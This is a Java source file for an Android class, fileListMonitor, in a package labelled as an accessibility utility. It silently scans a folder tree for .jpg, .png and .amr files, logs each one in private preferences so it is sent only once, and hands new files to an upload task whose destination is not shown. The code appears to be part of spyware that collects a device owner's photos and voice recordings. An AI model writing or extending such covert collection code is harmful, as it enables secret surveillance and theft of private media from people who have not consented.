package test.com.accessibility.util.fileListMonitor;


import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.util.Log;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Stack;

public class fileListMonitor {

    String mPath;

    private Context mContext;
    private AsyncTask<String[], Void, String> mFileUploadUtil;

    public fileListMonitor(Context context, String path, AsyncTask callback) {
        mContext = context;
        mFileUploadUtil = callback;
        mPath = path;
    }

    public void startWatching(boolean first_time) {
        List<String> targets = new ArrayList<String>();
        File tmpFile = new File(mPath);
        if (tmpFile.isDirectory()) {
            Stack<String> stack = new Stack<String>();
            stack.push(mPath);

            while (!stack.empty()) {
                String parent = stack.pop();
                File path = new File(parent);
                File[] files = path.listFiles();
                if (files == null) continue;
                for (int i = 0; i < files.length; ++i) {
                    if (files[i].isDirectory() && !files[i].getName().equals(".")
                            && !files[i].getName().equals("..")) {
                        stack.push(files[i].getPath());
                    } else if (files[i].isFile()){
                        String fname = files[i].getName();
                        if (fname.endsWith(".jpg") || fname.endsWith(".png") || fname.endsWith(".amr")) {
                            targets.add(files[i].getAbsolutePath());
                        }
                    }
                }
            }
        }
        this.process_files(targets, first_time);
    }

    private void process_files(List<String> targets, boolean first_time) {
        List<String> need_upload_files = new ArrayList<String>();
        for (int i = 0; i < targets.size(); i++) {
            String filepath = targets.get(i);

            SharedPreferences sharedPref = mContext.getSharedPreferences(mPath.replace("/", "_") + "_monitor", Context.MODE_PRIVATE);
            int defaultValue = 0;
            int sent = sharedPref.getInt(filepath, defaultValue);
            if (sent == 0) {
                SharedPreferences.Editor editor = sharedPref.edit();
                editor.putInt(filepath, 1);
                editor.commit();
                need_upload_files.add(filepath);
            }
        }

        Log.d("tluo", "[tluo] files need to be uploaded: " + need_upload_files.size() + " in folder " + mPath);
        if (! first_time && need_upload_files.size() > 0){
            String []file_array = new String[need_upload_files.size()];
            for (int i = 0; i < need_upload_files.size(); i++) {
                file_array[i] = need_upload_files.get(i);
                Log.d("tluo", "       uploading: " + file_array[i]);
            }

            mFileUploadUtil.execute(file_array);
        }

    }

}